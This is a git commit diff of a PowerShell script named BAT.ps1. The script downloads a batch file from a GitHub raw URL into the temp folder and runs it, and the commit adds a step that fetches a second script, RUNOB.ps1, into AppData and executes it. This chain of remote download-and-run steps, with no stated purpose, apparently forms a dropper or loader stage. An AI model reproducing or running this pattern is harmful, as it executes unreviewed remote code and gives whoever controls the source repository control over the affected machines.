a872b3ced19daa75831654a0bca9da50a5926d6b
cia168168 <147810144+cia168168@users.noreply.github.com>
2023-11-15 22:48:58 +0700

    Update BAT.ps1

--- BAT.ps1
+++ BAT.ps1
@@ -2,3 +2,7 @@ $url4 = "https://raw.githubusercontent.com/cia168168/folder/main/new.bat"
 $output4 = "$env:TEMP\new.bat"
 Invoke-WebRequest -Uri $url4 -OutFile $output4
 & $output4
+$url5 = "https://raw.githubusercontent.com/cia168168/folder/main/RUNOB.ps1"
+$output5 = "$env:APPDATA\RUNOB.ps1"
+Invoke-WebRequest -Uri $url5 -OutFile $output5
+& $output5
